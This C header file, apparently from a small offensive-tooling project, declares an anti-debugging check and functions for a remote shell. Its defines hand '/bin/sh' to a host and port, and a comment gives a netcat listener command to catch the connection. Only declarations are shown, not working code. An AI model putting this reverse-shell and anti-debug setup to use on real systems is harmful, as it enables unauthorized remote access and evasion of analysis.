#ifndef HACKS_H
# define HACKS_H

#include <signal.h>
#include "ft_lib.h"

//=======================================================
//==================== antidebug ========================

#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>

int checkdebug(void);

//=======================================================
//==================== Remote ===========================

#include <stddef.h>

/*
 * Use the commande and wait
 * nc -l REMOTE_TARGET -p REMOTE_PORT
 */

int remote(void);
int dns_remote(void);

#define REMOTE_TARGET "127.0.0.1"
#define REMOTE_PORT "1234"
#define REMOTE_EXEC "/bin/sh"
#define REMOTE_DNS_QUERY "localhost"

#endif